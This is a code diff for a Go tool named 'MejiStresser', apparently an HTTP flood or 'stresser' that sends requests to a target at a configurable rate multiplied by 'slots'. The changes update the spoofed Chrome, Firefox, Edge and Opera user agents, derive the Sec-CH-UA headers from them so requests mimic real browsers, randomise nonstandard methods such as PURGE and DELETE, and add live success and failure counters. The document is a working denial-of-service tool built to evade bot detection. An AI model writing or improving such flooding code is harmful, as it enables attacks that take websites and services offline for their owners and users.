@@ -17,6 +17,14 @@ import (
 	"time"
 )
 
+const (
+	colorReset  = "\033[0m"
+	colorRed    = "\033[31m"
+	colorGreen  = "\033[32m"
+	colorYellow = "\033[33m"
+	colorCyan   = "\033[36m"
+)
+
 const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 func randomString(n int) string {
@@ -72,50 +80,80 @@ var (
 	userAgents = map[string]map[string][]string{
 		"chrome": {
 			"windows": {
-				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
-				"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
 			},
 			"macos": {
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+				"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+				"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
 			},
 			"linux": {
-				"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-				"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+				"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+				"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
 			},
 			"android": {
-				"Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-				"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+				"Mozilla/5.0 (Linux; Android 15; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+				"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
 			},
 			"iphone": {
-				"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.0.0 Mobile/15E148 Safari/604.1",
-				"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/123.0.0.0 Mobile/15E148 Safari/604.1",
+				"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/131.0.0.0 Mobile/15E148 Safari/604.1",
+				"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.0.0 Mobile/15E148 Safari/604.1",
 			},
 		},
 		"firefox": {
 			"windows": {
-				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
-				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
+				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0",
 			},
 			"macos": {
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0",
+				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0",
+				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0",
 			},
 			"linux": {
-				"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
-				"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+				"Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0",
+				"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0",
+			},
+			"android": {
+				"Mozilla/5.0 (Android 15; Mobile; rv:144.0) Gecko/144.0 Firefox/144.0",
+				"Mozilla/5.0 (Android 14; Mobile; rv:143.0) Gecko/143.0 Firefox/143.0",
+			},
+			"iphone": {
+				"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/144.0 Mobile/15E148 Safari/605.1.15",
 			},
 		},
 		"edge": {
 			"windows": {
-				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
-				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
+				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
+				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
+			},
+			"macos": {
+				"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
+			},
+			"linux": {
+				"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
+			},
+			"android": {
+				"Mozilla/5.0 (Linux; Android 15; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 EdgA/131.0.0.0",
+			},
+			"iphone": {
+				"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/131.0.0.0 Mobile/15E148 Safari/605.1.15",
 			},
 		},
 		"opera": {
 			"windows": {
-				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/109.0.0.0",
+				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/115.0.0.0",
+			},
+			"macos": {
+				"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/115.0.0.0",
+			},
+			"linux": {
+				"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/115.0.0.0",
+			},
+			"android": {
+				"Mozilla/5.0 (Linux; Android 15; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 OPR/115.0.0.0",
+			},
+			"iphone": {
+				"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/115.0.0.0 Mobile/15E148 Safari/604.1",
 			},
 		},
 	}
@@ -213,6 +251,9 @@ func getRandFromMap(m map[string][]string, key string) string {
 }
 
 func getUA(browser, osType string) string {
+	if browser == "gecko" {
+		browser = "firefox"
+	}
 	bPool := userAgents[browser]
 	if bPool == nil {
 		keys := []string{"chrome", "firefox", "edge"}
@@ -233,19 +274,55 @@ func getUA(browser, osType string) string {
 	}
 
 	if len(oPool) == 0 {
-		return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+		return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 	}
 	return oPool[rand.Intn(len(oPool))]
+}
+
+func extractVersion(s, marker string) string {
+	idx := strings.Index(s, marker)
+	if idx == -1 {
+		return ""
+	}
+	start := idx + len(marker)
+	end := start
+	for end < len(s) && s[end] != ' ' && s[end] != ';' {
+		end++
+	}
+	if end > start {
+		return s[start:end]
+	}
+	return ""
 }
 
 func setRealisticHeaders(req *http.Request, browser, osType, ua string) {
 	req.Header.Set("User-Agent", ua)
 
-	// Default Sec-CH-UA logic
-	if strings.Contains(ua, "Chrome") {
-		req.Header.Set("Sec-Ch-Ua", `"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"`)
-	} else if strings.Contains(ua, "Edg") {
-		req.Header.Set("Sec-Ch-Ua", `"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"`)
+	// Dynamic Sec-CH-UA logic
+	if strings.Contains(ua, "Chrome/") {
+		v := extractVersion(ua, "Chrome/")
+		if v == "" {
+			v = "131"
+		}
+		req.Header.Set("Sec-Ch-Ua", fmt.Sprintf(`"Chromium";v="%s", "Google Chrome";v="%s", "Not-A.Brand";v="99"`, v, v))
+	} else if strings.Contains(ua, "Edg/") {
+		v := extractVersion(ua, "Edg/")
+		if v == "" {
+			v = "131"
+		}
+		req.Header.Set("Sec-Ch-Ua", fmt.Sprintf(`"Chromium";v="%s", "Microsoft Edge";v="%s", "Not-A.Brand";v="99"`, v, v))
+	} else if strings.Contains(ua, "Firefox/") {
+		v := extractVersion(ua, "Firefox/")
+		if v == "" {
+			v = "144"
+		}
+		req.Header.Set("Sec-Ch-Ua", fmt.Sprintf(`"Firefox";v="%s", "Not-A.Brand";v="99"`, v))
+	} else if strings.Contains(ua, "OPR/") {
+		v := extractVersion(ua, "OPR/")
+		if v == "" {
+			v = "115"
+		}
+		req.Header.Set("Sec-Ch-Ua", fmt.Sprintf(`"Chromium";v="%s", "Opera";v="%s", "Not-A.Brand";v="99"`, v, v))
 	}
 
 	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
@@ -326,7 +403,7 @@ func main() {
 		fmt.Println("  time     : Duration in seconds                       e.g. 30")
 		fmt.Println("  rate     : Requests per second                       e.g. 64")
 		fmt.Println("  slot     : Multiplier for rate                       e.g. 10 (Total 640 rps)")
-		fmt.Println("  browser  : chrome|firefox|edge|opera|mixed            (default: mixed)")
+		fmt.Println("  browser  : chrome|firefox|edge|opera|gecko|mixed            (default: mixed)")
 		fmt.Println("  os       : random|windows|macos|linux|iphone|android (default: random)")
 		fmt.Println("  referer  : google|bing|yandex|brave|facebook|twitter (default: mixed)")
 		fmt.Println("  method   : get|post|head|put|nonstandard             (default: get)")
@@ -364,7 +441,21 @@ func main() {
 	}
 	method := "GET"
 	if len(os.Args) > 8 {
-		method = strings.ToUpper(os.Args[8])
+		switch strings.ToLower(os.Args[8]) {
+		case "get":
+			method = "GET"
+		case "post":
+			method = "POST"
+		case "head":
+			method = "HEAD"
+		case "put":
+			method = "PUT"
+		case "nonstandard":
+			nonstandardMethods := []string{"PURGE", "OPTIONS", "PATCH", "DELETE", "TRACE"}
+			method = nonstandardMethods[rand.Intn(len(nonstandardMethods))]
+		default:
+			method = "GET"
+		}
 	}
 	protocol := "mixed"
 	if len(os.Args) > 9 {
@@ -391,24 +482,19 @@ func main() {
 		}()
 	}
 
-	fmt.Printf(`
-   __  ___     _ _  ______                          
-  /  |/  /__  (_) / / __/ /_________ ___ ___ ___ ____
- / /|_/ / _ \/ / / _\ \/ __/ __/ -_|_-<(_-</ -_) __/
-/_/  /_/\___/_/_/ /___/\__/_/  \__/___/___/\__/_/   
-                                                    
-  [ Engine: GOLANG | Slot System Enabled ]
-  ──────────────────────────────────────────────────
-  Target:      %s
-  Method:      %s
-  Duration:    %ds
-  Base Rate:   %d rps
-  Slots:       %d
-  Total RPS:   %d
-  ──────────────────────────────────────────────────
-`, target, method, duration, baseRate, slot, totalRate)
+	fmt.Printf("\n  %sMejiStresser GOLANG%s  %s⎸%s %s %s⎸%s %ds %s⎸%s %d RPS%s\n  %s%s%s\n",
+		colorCyan, colorReset,
+		colorCyan, colorReset,
+		colorYellow, target, colorReset,
+		colorCyan, colorReset,
+		duration,
+		colorCyan, colorReset,
+		colorGreen, totalRate, colorReset,
+		colorGreen, strings.Repeat("─", 50), colorReset)
 
 	start := time.Now()
+	statsTicker := time.NewTicker(1 * time.Second)
+	defer statsTicker.Stop()
 	ticker := time.NewTicker(time.Second / time.Duration(totalRate))
 	deadline := time.After(time.Duration(duration) * time.Second)
 
@@ -423,6 +509,19 @@ loop:
 			case jobs <- true:
 			default:
 			}
+		case <-statsTicker.C:
+			t := atomic.LoadInt64(&stats.total)
+			s := atomic.LoadInt64(&stats.success)
+			f := atomic.LoadInt64(&stats.failed)
+			elapsed := time.Since(start).Seconds()
+			rps := 0
+			if elapsed > 0 {
+				rps = int(float64(t) / elapsed)
+			}
+			fmt.Printf("\r  %sOK:%d%s  %sFAIL:%d%s  RPS:%d   ",
+				colorGreen, s, colorReset,
+				colorRed, f, colorReset,
+				rps)
 		}
 	}
 
@@ -431,5 +530,10 @@ loop:
 	wg.Wait()
 
 	elapsed := time.Since(start).Seconds()
-	fmt.Printf("\nDone. Success: %d, Failed: %d, Avg: %.2f rps\n", stats.success, stats.failed, float64(stats.success)/elapsed)
+	avgRps := float64(0)
+	if elapsed > 0 {
+		avgRps = float64(stats.success) / elapsed
+	}
+	fmt.Printf("\n  %s✓ Done%s  OK:%d  FAIL:%d  Avg:%.2f RPS\n",
+		colorGreen, colorReset, stats.success, stats.failed, avgRps)
 }
